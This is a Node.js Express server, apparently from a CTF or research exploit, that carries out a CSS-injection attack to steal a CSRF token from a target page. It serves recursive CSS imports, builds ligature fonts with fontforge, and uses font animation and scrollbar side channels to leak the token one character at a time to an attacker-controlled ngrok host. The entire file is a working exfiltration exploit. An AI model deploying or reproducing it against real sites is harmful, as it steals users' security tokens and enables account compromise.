const express = require('express');
const js2xmlparser = require('js2xmlparser');
const fs = require('fs');
const tmp = require('tmp');
const rimraf = require('rimraf');
const child_process = require('child_process');

const app = express();
app.disable('etag');

// Config
const PORT = 22000;
const HOSTNAME = "https://a22c2da74489.ngrok.io";// + PORT;
const CHARSET = "0123456789abcdef"
const PREFIX = '';
const LOG = 16;
const DEBUG = true;
const DELAY = '3s';
const DURATION = '20s';
const WIDTH = '80px';
const DEL = '_';
const PATH = ['body', 'ul', 'li', 'form'].reverse();

// thanks to @SecurityMB:
// https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/
function createFont(prefix, charsToLigature) {
    let font = {
        "defs": {
            "font": {
                "@": {
                    "id": "hack",
                    "horiz-adv-x": "0"
                },
                "font-face": {
                    "@": {
                        "font-family": "hack",
                        "units-per-em": "1000"
                    }
                },
                "glyph": []
            }
        }
    };

    let glyphs = font.defs.font.glyph;
    for (let c = 0x20; c <= 0x7e; c += 1) {
        const glyph = {
            "@": {
                "unicode": String.fromCharCode(c),
                "horiz-adv-x": "0",
                "d": "M1 0z",
            }
        };
        glyphs.push(glyph);
    }

    charsToLigature.forEach(c => {
        const glyph = {
            "@": {
                "unicode": prefix + c,
                "horiz-adv-x": "20000",
                "d": "M1 0z",
            }
        }
        glyphs.push(glyph);
    });

    const xml = js2xmlparser.parse("svg", font);

    const tmpobj = tmp.dirSync();
    fs.writeFileSync(`${tmpobj.name}/font.svg`, xml);
    child_process.spawnSync("/usr/bin/fontforge", [
        `${__dirname}/script.fontforge`,
        `${tmpobj.name}/font.svg`
    ]);

    const woff = fs.readFileSync(`${tmpobj.name}/font.woff`);

    rimraf.sync(tmpobj.name);

    return woff;
}

// Utils

const encode = e => encodeURIComponent(e).replace(/\./g,'%252E');

function log() {
    if (DEBUG) console.log.apply(console, arguments);
}

function split(str, n=2) {
    return str.match(new RegExp('.{1,'+(Math.ceil(str.length/n))+'}','g'));
}

// CSS generation

// define fonts with src to on-the-fly ligature generation
function genFontFacesCSS (prefix, input, chars) {
    return `@font-face{font-family:"empty";src:url(${HOSTNAME}/font/${encode(prefix+input)}/%C2%AC)}` + split(chars, LOG).map((c,i) => `@font-face{font-family:"hack_${input+"_"+c+"_"+i}";src:url(${HOSTNAME}/font/${encode(prefix+input)}/${encode(c)})}`).join('')+'\n';
};

// use animation to iterate over a bunch of different fonts, only leak if one matches (i.e. triggers the scrollbar)
function genAnimation (chars, input, ttl) {
    let chunks = split(chars, LOG);
    let delta = Math.floor(100 / chunks.length / 2);
    return `@keyframes wololo_${n} {\n` +
        chunks.map((e,i) => {
            return `${delta*i*2}%{font-family:"empty";--x:0}\n` +
                `${delta*(i*2+1)}%{font-family:"hack_${input+"_"+e+"_"+i}";--x:url(${HOSTNAME}/leak?ttl=${ttl}&pre=${encode(input)}&chars=${encode(e)});}\n`;
        }).join('') +
        `100%{font-family:"empty";--x:0}\n` +
        `}\n`;
};

// basic setup for scrollbar detection
function genInjection (selector='.foo', iterations=0, width='450px', delay='2s', duration='20s') {
    let specificity = PATH.slice(0,iterations).reverse().join(' > ') + " ";
    return `${specificity + selector}{
    overflow-x: auto;
    white-space: nowrap;
    height: 40px;
    width: ${width};
    animation-duration: ${duration};
    animation-delay: ${delay};
    font-family: "empty";
    background: lightblue;
    animation-name: wololo_${n};
}
${specificity + selector}::-webkit-scrollbar {
    background: blue;
}
${specificity + selector}::-webkit-scrollbar:horizontal {
    background:var(--x);
}`;
};

// generate next payload
function genResponse (res, ttl, chars) {
    console.log('...payload ('+ n +'): ' + split(chars, LOG));
    var css =
        '@import url('+ HOSTNAME + '/next?' + Math.random() + ');\n\n' +
        genFontFacesCSS(PREFIX, input, chars) +
        genAnimation(chars, input, ttl) +
        genInjection('textarea[name=csrf]', n, WIDTH, DELAY, DURATION);
    res.set({
        //'Cache-Control': 'public, max-age=600',
        'Content-Type': 'text/css',
    });
    res.end(css);
    n = n + 1;
}

// Router & CSS recursive import logic

var pending = [], ready = 0, n = 0, input = "", ttl = 10;

app.get("/font/:prefix/:charsToLigature", (req, res) => {
    const { prefix, charsToLigature } = req.params;
    res.set({
        'Cache-Control': 'public, max-age=600',
        'Content-Type': 'application/x-font-woff',
        'Access-Control-Allow-Origin': '*',
    });
    res.end(createFont(decodeURIComponent(prefix), Array.from(decodeURIComponent(charsToLigature))));
});

// first request, reset everything
app.get("/start", (req, res) => {
    log("===============================");
    ready = 0;
    n = 0;
    pending = [];
    chars = CHARSET;
    input = "id";
    ttl = 10;
    genResponse(res, ttl, chars);
});

// only keep first response, loop until we get 1 char, then mark as ready or send payload
app.get("/leak", (req, res) => {
    res.sendStatus(200).end();
    req.query.ttl = parseInt(req.query.ttl, 10);
    req.query.pre = decodeURIComponent(req.query.pre);
    req.query.chars = decodeURIComponent(req.query.chars);
    if (req.query.chars && req.query.ttl >= ttl) {
        ttl = ttl + 1;
        if (req.query.chars.length === 1) {
            input += req.query.chars;
            chars = CHARSET; // prepare next binary search
        } else {
            chars = req.query.chars; // keep binary search
        }
        console.log('recv: %s', input);
    } else {
        return;
    }
    if (ready == 1) {
        genResponse(pending.shift(), ttl, chars);
        ready = 0;
    } else {
        ready++;
        log('\tleak: waiting others...');
    }
});

// send next payload when ready
app.get("/next", (req, res) => {
    if (ready == 1) {
        genResponse(res, ttl, chars);
        ready = 0;
    } else {
        pending.push(res);
        ready++;
        log('\tquery: waiting others...');
    }
});

app.get('/index.html', (req, res) => {
	res.sendFile('index.html', {
		root: '.'
	});
});

app.listen(PORT, () => {
	console.log(`Listening on ${PORT}...`);
})